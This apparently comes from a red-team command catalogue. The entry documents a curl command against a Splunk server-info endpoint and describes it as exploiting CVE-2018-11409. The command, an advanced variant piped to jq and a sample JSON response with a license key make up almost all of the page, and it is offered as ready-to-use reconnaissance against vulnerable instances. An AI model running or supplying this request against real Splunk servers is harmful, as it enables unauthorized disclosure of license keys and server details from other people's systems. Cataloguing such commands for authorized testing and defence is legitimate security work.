---
id: cmd-curl-splunk-info
data: >-
  curl -k
  "https://splunk.example.com/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json"
tags:
  - reconnaissance
  - information-disclosure
type: command
output: JSON response with server info including license key
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:13.135Z'
verified: false
validated: true
submitted: true
---
# curl-splunk-server-info

## Command

```bash
curl -k "https://splunk.example.com/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json"
```

## Description

This command uses curl to perform an unauthenticated GET request to the Splunk server info endpoint, exploiting CVE-2018-11409 to disclose sensitive data like the license key and server details. It is useful for quick reconnaissance against vulnerable Splunk instances.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Insecure mode: skips SSL certificate verification (useful for self-signed certs) | No |
| URL | Target Splunk endpoint; replace `splunk.example.com` with actual host | Yes |

## Examples

### Basic Usage

```bash
curl -k "https://splunk.example.com/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json"
```

### Advanced Usage

```bash
curl -k -s "https://splunk.example.com/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json" | jq '.'
```

Add `-s` for silent mode and pipe to jq for pretty-printing JSON.

## Expected Output

Successful execution returns a JSON object like:

```json
{
  "serverInfo": {
    "license": {
      "key": "MIIT... (license key)" 
    },
    "version": "7.0.1",
    "serverName": "example-server"
  }
}
```

Errors include 401 Unauthorized if patched, or connection refused if inaccessible.

## Related

- [[Related Procedure: Access-Splunk-Server-Info-Endpoint]]
